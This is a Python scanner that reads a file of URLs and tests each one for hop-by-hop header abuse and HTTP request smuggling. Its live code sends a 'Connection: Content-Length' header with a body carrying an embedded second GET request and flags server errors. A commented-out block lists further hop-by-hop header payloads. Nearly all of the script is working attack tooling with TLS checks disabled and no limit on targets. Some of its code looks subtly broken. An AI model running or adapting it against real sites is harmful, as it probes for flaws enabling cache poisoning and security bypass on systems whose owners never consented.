#! /usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import sys
import random
import traceback
from pprint import pprint
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def HBH(url, s):
    """headers_list = [
        {'Connection': 'close, X-HopByHop', 'X-HopByHop': 'plopiplop'},
        {"Keep-Alive": "X-HopByHop", "X-HopByHop": "plopiplop"},
        {"Transfer-encoding": "X-HopByHop", "X-HopByHop": "plopiplop"},
        {"Connection": "X-HopByHop", "X-HopByHop": "plopiplop"},
        {"Trailer": "X-HopByHop", "X-HopByHop": "plopiplop"},
        {"Upgrade": "X-HopByHop", "X-HopByHop": "plopiplop"},
        {"Proxy-authorization": "X-HopByHop", "X-HopByHop": "plopiplop"},
        {"Proxy-authenticate": "X-HopByHop", "X-HopByHop": "plopiplop"},
        ]

    for h in headers_list:
        res_main = s.get(url, verify=False, timeout=10)
        response = s.get(url, headers=h, verify=False, timeout=10)

        if 'X-HopByHop' in response.headers and response.status_code != res_main.status_code:
            print(f' !! {url} {h} [{res_main.status_code} > {response.status_code}]')
        elif 'X-HopByHop' in response.headers or "plopiplop" in response.headers:
            print(f' {url} {h} [{res_main.status_code} > {response.status_code}]')
            #pass
        elif response.status_code != res_main.status_code and response.status_code == 404:
            print(f' {url} {h} [{res_main.status_code} > {response.status_code}]')
        elif 'X-HopByHop' in response.text or "plopiplop" in response.text:
            print(f' REFLECTION | {url} {h} [{res_main.status_code} > {response.status_code}]')"""
    res_main = s.get(url, verify=False, timeout=10)

    headers = {
        "Connection": "Content-Length",
        }

    body = repr(
        "   \r\n\r\n"
        "   GET / HTTP/1.1\r\n"
        "   Host: www.example.com\r\n"
        "   X-Foo: x\r\n"
    )

    #print(body)

    response = s.get(url, headers=headers, data=body, verify=False, timeout=10)
    if response.status_code > 500 and response.status_code != res_main.status_code:
        print(f'   └── {url} [{res_main.status_code} > {response.status_code}]\n     └── H {headers}\n    └── B {body}')

if __name__ == "__main__":
    url_file = sys.argv[1]
    s = requests.Session()
    #HBH(url_file, s)
    with open(url_file, "r") as urls:
        urls = urls.read().splitlines()
        for url in urls:
            url = "{}?cb={}".format(url, random.randrange(999))
            try:
                req_main = requests.get(url, verify=False, timeout=10)
                main_status_code = req_main.status_code
                authent = False
                HBH(url, s)
            except KeyboardInterrupt:
                print("Exiting")
                sys.exit()
            except Exception as e:
                #print(f"\nError : {e}\n")
                #traceback.print_exc()
                pass
            print(f" {url}", end='\r')
